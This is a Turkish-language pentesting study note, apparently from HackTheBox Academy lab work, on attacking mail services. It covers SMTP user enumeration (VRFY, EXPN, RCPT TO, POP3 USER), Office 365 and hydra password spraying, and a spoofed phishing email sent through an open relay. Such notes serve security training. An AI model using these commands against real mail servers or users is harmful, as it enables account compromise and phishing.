# SMTP simple mail Transfer Protokol


**Default Ports**

+ `25`, `143`, `110`, `465`, `587`, `993`,`995`

+ Bir posta sunucusunu tanımlamak için Mail eXchanger (MX) DNS kaydını kullanabiliriz

+ **MX kaydı, bir alan adı adına e-posta iletilerini kabul etmekten sorumlu olan posta sunucusunu belirtir**
    + **mx** birinin diğerine mail attığında gideceği yeri belirler

+ MX kayıtları hakkındaki bilgileri sorgulamak için `host` veya `dig` gibi araçlardan ve `MXToolbox` gibi çevrim içi web sitelerinden yararlanabiliriz.


## Host - MX Records

```bash
host -t MX hackthebox.eu

hackthebox.eu mail is handled by 1 aspmx.l.google.com.
```

```bash
host -t MX microsoft.com

microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.
```

## DIG - MX Records

```bash
dig mx plaintext.do | grep "MX" | grep -v ";"

plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
plaintext.do.           7076    IN      MX      10 mx.zoho.com.
plaintext.do.           7076    IN      MX      20 mx2.zoho.com.
```

```bash
dig mx inlanefreight.com | grep "MX" | grep -v ";"

inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.
```


## Host - A Records

```bash
host -t A mail1.inlanefreight.htb.

mail1.inlanefreight.htb has address 10.129.14.128
```



--- 

## enumeration

```bash
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128


25/tcp open  smtp    Postfix smtpd
|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY,
```

### Authentication

SMTP sunucusu, geçerli kullanıcı adlarını tespit etmek (numaralandırmak) için kullanılabilecek `VRFY`, `EXPN` ve `RCPT TO` gibi çeşitli komutlara sahiptir. Geçerli kullanıcı adlarını başarıyla tespit edebilirsek; parola deneme saldırıları (password spraying), kaba kuvvet saldırıları (brute-forcing) gerçekleştirebilir veya geçerli bir parolayı tahmin etmeye çalışabiliriz. Gelin, bu komutların nasıl çalıştığını inceleyelim.



#### 1. VRFY
alıcı `SMTP` sunucusuna belirli bir **e-posta** kullanıcı adının geçerliliğini kontrol etmesi talimatını verir. Sunucu, kullanıcının var olup olmadığını belirten bir yanıt döner. Bu özellik devre dışı bırakılabilir.


**VRFY Command**

```bash
telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


VRFY root

252 2.0.0 root


VRFY www-data

252 2.0.0 www-data


VRFY new-user

550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```


#### 2. EXPN

VRFY komutuna benzer; ancak bir dağıtım listesiyle kullanıldığında, söz konusu listedeki tüm kullanıcıları sıralar. Sitelerde genellikle "all" (hepsi) gibi takma adlar (alias) bulunabildiğinden, bu durum VRFY komutuna kıyasla daha büyük bir sorun teşkil edebilir.

```bash
telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


EXPN john

250 2.1.0 john@inlanefreight.htb


EXPN support-team

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```


#### 3. RCPT TO
e-posta iletisinin alıcısını belirtir. Bu komut, tek bir iletiyi birden fazla alıcıya ulaştırmak amacıyla, söz konusu ileti için defalarca yinelenebilir.



```bash
telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown


RCPT TO:kate

550 5.1.1 kate... User unknown


RCPT TO:john

250 2.1.5 john... Recipient ok
```


#### 4. USER
Hizmetin nasıl uygulandığına bağlı olarak, kullanıcıları listelemek için POP3 protokolünden de yararlanabiliriz. Örneğin, USER komutunun ardından kullanıcı adını girdiğimizde sunucu "OK" yanıtını veriyorsa, bu, söz konusu kullanıcının sunucuda mevcut olduğu anlamına gelir.


```bash
telnet 10.10.110.20 110

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
+OK POP3 Server ready

USER julio

-ERR


USER john

+OK
```

##### otomatize user enum

```bash
cd /opt/SMTPeek/target/release

 ./smtpeek -u /root/htb-academy/users.list -d inlanefreight.htb -c 5 10.129.203.7

```

## Cloud Enumeration

### O365 Spray

**Hedef etki alanımız Office 365 kullanıyorsa ilk önce onaylayalım.**

```bash
python3 o365spray.py --validate --domain msplaintext.xyz

[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz
```

**Username brute force yapabiliriz.**

```bash
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz       


[2022-04-13 09:48:04,062] INFO : [VALID] The following domain is using O365: msplaintext.xyz
```




### Password Attacks

#### hydra

```bash
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3


[110][pop3] host: 10.129.42.197   login: john   password: Company01!
```

ancak bu tür araçlar genellikle engellenir. 
+ Bunun yerine, **Microsoft Office 365** için **o365spray** veya **MailSniper**;
+ Gmail ya da Okta içinse **CredKing** gibi özel araçlardan yararlanmayı deneyebiliriz


```bash
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

## Open Relay

**open relay, hatalı yapılandırılmış ve kimlik doğrulaması gerektirmeyen e-posta aktarımına izin veren bir Basit Posta Aktarım Protokolü (SMTP) sunucusudur.**

Saldırgan açısından bakıldığında, bunu var olmayan kullanıcılar adına e-posta göndererek veya başkasının e-posta adresini taklit ederek kimlik avı için kötüye kullanabiliriz. Örneğin, açık röle posta sunucusuna sahip bir kuruluşu hedeflediğimizi ve çalışanlarına bildirim göndermek için belirli bir e-posta adresi kullandıklarını tespit ettiğimizi düşünelim. Aynı adresi kullanarak benzer bir e-posta gönderebilir ve bu bilgiyle birlikte kimlik avı bağlantımızı ekleyebiliriz.

+ **nmap smtp-open-relay komut dosyası ile bir SMTP portunun açık röleye izin verip vermediğini belirleyebiliriz.**

```bash
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)
```

+ **Ardından, posta sunucusuna bağlanmak ve e-postamızı göndermek için herhangi bir posta istemcisini kullanabiliriz.**

```bash
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```
